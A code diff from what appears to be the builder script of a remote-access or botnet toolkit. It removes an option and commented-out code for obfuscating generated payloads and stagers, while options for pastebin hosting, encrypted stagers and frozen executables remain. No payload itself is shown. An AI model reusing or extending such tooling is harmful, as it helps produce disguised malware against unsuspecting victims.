@@ -20,7 +20,6 @@ optional arguments:
   --icon ICON     icon image file name
   --pastebin API  upload & host payload on pastebin
   --encrypt       encrypt payload and embed key in stager
-  --obfuscate     obfuscate names of classes, functions & variables
   --compress      zip-compress into a self-executing python script
   --freeze        compile client into a standalone executable for the current host platform
 
@@ -165,10 +164,6 @@ def main():
                         action='store_true',
                         help='encrypt the payload with a random 128-bit key embedded in the payload\'s stager',
                         default=False)
-#    parser.add_argument('--obfuscate',
-#                        action='store_true',
-#                        help='obfuscate names of classes, functions, variables, import-methods, and builtin-keywords',
-#                        default=False)
 
     parser.add_argument('--compress',
                         action='store_true',
@@ -292,15 +287,6 @@ def _payload(options, **kwargs):
         except OSError:
             util.log("Permission denied: unabled to make directory './modules/payloads/'")
 
- #   if options.obfuscate:
- #       __load__= threading.Event()
- #       util.display("\tObfuscating payload... ", color='reset', style='normal', end=',')
- #       __spin__= _spinner(__load__)
- #       output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
- #       __load__.set()
- #       _update(payload, output, task='Obfuscation')
- #       payload = output
-
     if options.compress:
         util.display("\tCompressing payload... ", color='reset', style='normal', end=',')
         __load__ = threading.Event()
@@ -366,15 +352,6 @@ def _stager(options, **kwargs):
             os.mkdir('modules/stagers')
         except OSError:
             util.log("Permission denied: unable to make directory './modules/stagers/'")
-
-#    if options.obfuscate:
-#        util.display("\tObfuscating stager... ", color='reset', style='normal', end=',')
-#        __load__ = threading.Event()
-#        __spin__ = _spinner(__load__)
-#        output = generators.obfuscate(stager)
-#        __load__.set()
-#        _update(stager, output, task='Obfuscation')
-#        stager = output
 
     if options.compress:
         util.display("\tCompressing stager... ", color='reset', style='normal', end=',')
